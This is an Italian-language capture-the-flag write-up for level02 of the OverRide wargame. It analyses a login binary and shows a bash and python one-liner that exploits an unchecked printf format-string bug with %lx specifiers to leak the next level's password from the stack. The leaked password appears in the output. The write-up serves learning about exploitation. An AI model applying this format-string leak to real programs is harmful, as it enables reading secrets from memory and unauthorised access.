# Level 02
Controlliamo le stringhe presenti nel binario:
```
level02@OverRide:~$ readelf -p '.rodata' level02

String dump of section '.rodata':
  [     8]  r
  [     a]  /home/users/level03/.pass
  [    28]  ERROR: failed to open password file^J
  [    50]  ERROR: failed to read password file^J
  [    78]  ===== [ Secure Access System v1.0 ] =====
  [    a8]  /***************************************\
  [    d8]  | You must login to access this system. |
  [   108]  \**************************************/
  [   131]  --[ Username:
  [   140]  --[ Password:
  [   150]  *****************************************
  [   17a]  Greetings, %s!^J
  [   18a]  /bin/sh
  [   192]   does not have access!
```
E ora passiamo a `gdb`:
```
level02@OverRide:~$ gdb -q level02
Reading symbols from /home/users/level02/level02...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400640  _init
0x0000000000400670  strncmp
0x0000000000400670  strncmp@plt
0x0000000000400680  puts
0x0000000000400680  puts@plt
0x0000000000400690  fread
0x0000000000400690  fread@plt
0x00000000004006a0  fclose
0x00000000004006a0  fclose@plt
0x00000000004006b0  system
0x00000000004006b0  system@plt
0x00000000004006c0  printf
0x00000000004006c0  printf@plt
0x00000000004006d0  strcspn
0x00000000004006d0  strcspn@plt
0x00000000004006e0  __libc_start_main
0x00000000004006e0  __libc_start_main@plt
0x00000000004006f0  fgets
0x00000000004006f0  fgets@plt
0x0000000000400700  fopen
0x0000000000400700  fopen@plt
0x0000000000400710  exit
0x0000000000400710  exit@plt
0x0000000000400720  fwrite
0x0000000000400720  fwrite@plt
0x0000000000400730  _start
0x000000000040075c  call_gmon_start
0x0000000000400780  __do_global_dtors_aux
0x00000000004007f0  frame_dummy
0x0000000000400814  main
0x0000000000400ac0  __libc_csu_init
0x0000000000400b50  __libc_csu_fini
0x0000000000400b60  __do_global_ctors_aux
0x0000000000400b98  _fini
```

### Funzione `main`
La funzione apre il file contenente la password che ci serve per poi salvarla in una variabile nello stack,
successivamente chiede username e password e confronta la password inserita dall'utente con quella presente
nel file, se sono uguali allora aprirà una shell altrimenti il programma termina.

### Soluzione
L'username inserito dall'utente, in caso di password non corretta, viene stampato a schermo tramite `printf`
senza alcun controllo, dunque sfrutteremo questo per andare alla ricerca nello stack della variabile dove è 
salvata la vera password. Dopo qualche prova con gli specificatori `%x` ho individuato la password nell'offset
22 fino alla posizione 26, quindi ho creato un piccolo script in bash per chiamare ogni volta il programma con
un offset che avanza di volta in volta, prende l'esadecimale, lo converte in ascii e applica un reverse:
```
level02@OverRide:~$ for i in {22..26}; do python -c "print '%$i\$lx' + '\n' + 'sdbstb'" | ./level02 | grep "access\!" | cut -d " " -f 1 | python -c "data = raw_input(); print(data.decode('hex')[::-1])" | tr -d "\n" ; done ; echo ""
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
level02@OverRide:~$ su level03
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
level03@OverRide:~$
```